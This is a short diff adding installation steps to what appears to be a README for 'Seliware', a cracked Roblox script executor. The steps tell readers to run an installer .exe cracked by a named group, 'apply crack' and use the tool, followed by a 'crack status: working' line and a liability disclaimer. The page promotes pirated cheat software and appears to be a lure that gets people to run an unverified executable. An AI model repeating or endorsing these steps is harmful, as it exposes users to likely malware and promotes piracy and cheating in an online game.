@@ -1,5 +1,14 @@
 Seliware is a Roblxo script execution software.
 
+- INSTRUCTIONS -
+
+1. RUN INSTALLER .EXE (Seliware CRACKED BY ANALCREAM)
+2. GO THROUGH WITH INSTALLATION
+3. CLICK APPLY CRACK
+4. WAIT TIL FINISHED
+5. OPEN AND USE`
+
+
 04/10/2026 - CRACK STATUS : WORKING
 
 Any illegal actvity or misuse of this software does not autoatically make me liable for any amount of damage caused bby this program.
